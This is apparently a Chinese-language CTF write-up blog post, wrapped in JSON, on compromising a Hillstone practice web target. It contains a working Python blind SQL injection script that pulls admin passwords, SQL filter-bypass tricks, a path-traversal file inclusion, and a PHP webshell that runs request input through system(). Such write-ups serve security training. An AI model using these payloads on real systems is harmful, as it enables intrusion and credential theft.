{"posts":[{"title":"山石网科靶机实战WP","content":"Writeup 信息收集记录： 有搞头的页面/目录/文件信息 部分存在登录、查询、注册、修改等业务的页面和目录遍历、敏感信息等 http://web1-1.ctf.hillstonenet.com/Company_admin/login.php // 登录 [15:19:56] 200 - 6KB - /composer.lock [15:19:56] 200 - 218B - /composer.json [15:19:57] 301 - 178B - /css -&gt; http://web1-1.ctf.hillstonenet.com/css/ [15:20:00] 301 - 178B - /fonts -&gt; http://web1-1.ctf.hillstonenet.com/fonts/ [15:20:01] 301 - 178B - /functions -&gt; http://web1-1.ctf.hillstonenet.com/functions/ [15:20:01] 403 - 564B - /functions/ [15:20:03] 301 - 178B - /images -&gt; http://web1-1.ctf.hillstonenet.com/images/ [15:20:03] 200 - 6KB - /index.php [15:20:04] 301 - 178B - /js -&gt; http://web1-1.ctf.hillstonenet.com/js/ [15:20:10] 301 - 178B - /plugins -&gt; http://web1-1.ctf.hillstonenet.com/plugins/ [15:20:11] 200 - 69B - /README.md [15:20:12] 200 - 40B - /robots.txt [15:20:12] 301 - 178B - /screenshots -&gt; http://web1-1.ctf.hillstonenet.com/screenshots/ [15:20:17] 200 - 0B - /vendor/autoload.php [15:20:17] 200 - 0B - /vendor/composer/autoload_classmap.php [15:20:17] 200 - 0B - /vendor/composer/autoload_namespaces.php [15:20:17] 200 - 5KB - /vendor/composer/installed.json [15:20:17] 200 - 0B - /vendor/composer/autoload_real.php [15:20:17] 200 - 0B - /vendor/composer/autoload_psr4.php [15:20:17] 200 - 1KB - /vendor/composer/LICENSE [15:20:17] 200 - 0B - /vendor/composer/autoload_static.php [15:20:17] 200 - 0B - /vendor/composer/ClassLoader.php [15:20:19] 200 - 2KB - /footer.php // email提交 [15:20:19] 200 - 6KB - /contact.php // 留言板，可以尝试xss [15:20:19] 200 - 6KB - /blog.php // Birthday-Date [15:20:19] 200 - 9KB - /about.php [15:20:20] 200 - 78B - /single.php // // id参数存在注入 [15:20:29] 200 - 5KB - /portfolio.php &quot;http://web1-1.ctf.hillstonenet.com:80//footer.php&quot; url &quot;http://web1-1.ctf.hillstonenet.com:80/composer.lock&quot; url &quot;http://web1-1.ctf.hillstonenet.com:80/composer.json&quot; url &quot;http://web1-1.ctf.hillstonenet.com:80/vendor/composer/LICEN # email :info@example.com # phone : +(254) 754 235 535 # birthday：10.27 通过源代码中关键字： Github: 通过当前网站的PHP页面，配合github的项目文件，判断项目为源代码 SQL注入Bypass，黑盒测试如下 FuzZ list： fuzz时线程调低 %0a %0b %0d代替 空格 like，regexp 代替 = 具体很多函数很多查询函数都可以进行利用，尝试查询表和密码 后续得到源码后，配合FUzz结果进行注入： SQL查询语句，将参数进行了直接拼接,GET进行参数传递 GET输入的内容，会在后续进行输出： 当条件为True： 当条件为Fasle： #!/usr/bin/ python # -*- coding:utf-8 -*- &quot;&quot;&quot; ------------------------------------------------- Author: myst1c Datetime: 2020/10/26 20:23 ProjectName: mianshi.py ------------------------------------------------- &quot;&quot;&quot; import requests url = &quot;http://web1-1.ctf.hillstonenet.com:80/single.php?id=&quot; def getData(): data = &quot;&quot; for q in range(0, 50): for i in range(26, 132): # payload = url + '1 or ascii(substr((select database()), {}, 1)) like \\&quot;{}\\&quot;'.format(q, i) # payload = url + '1 or ascii(substr((select table_name from information_schema.tables where table_schema like \\&quot;hs_test_s1_blog\\&quot; limit 0,1),{},1)) like \\&quot;{}\\&quot;'.format(q, i) # ayload = url + '1 or ascii(substr((select column_name from information_schema.columns where table_name like \\&quot;admin\\&quot; limit 1,1),{},1)) like &quot;{}&quot;'.format(q, i) #payload = url + '1 or ascii(substr((select column_name from information_schema.columns where table_name like \\&quot;admin\\&quot; limit 3,1),{},1)) like &quot;{}&quot;'.format(q, i) payload = url + '1 or ascii(substr((select group_concat(id,password) from admin),{},1)) like &quot;{}&quot;'.format(q, i) try: fin_payload = payload.replace(&quot; &quot;, &quot;%0d&quot;) rep = requests.get(url=fin_payload) if &quot;guys!!&quot; in rep.text: data += chr(i) print(&quot;[+] Data: &quot; + data) else:pass except:pass def main(): getData() if __name__ == '__main__': main() 数据库： 查表： 查列： 查密码，直接通过group_concat查： 还有一个4位数的密码，之前说过要用到些社工技巧，回头在页面找点信息 然后进入后台界面，找一下可以利用的点，发现上传页面 但是无法连接shell，寻找一下其他可以利用的点，然后在 http://web1-1.ctf.hillstonenet.com/Company_admin/language.php?template=../../language.php 包含当前PHP文件，内容异常，说明可能被解析了 这里可以确定大致思路就是上传图片马，然后利用文件包含图片马执行cmd命令来获取flag cmd图片马 &lt;?php if(isset($_REQUEST['cmd'])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST['cmd']); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; } ?&gt; 这里有个点就是%0a可以绕过空格，但是用${IFS}才可以查询 get flag ","link":"https://mystic-Xxx.github.io/post/shan-shi-wang-ke-ba-ji-shi-zhan-wp/"}]}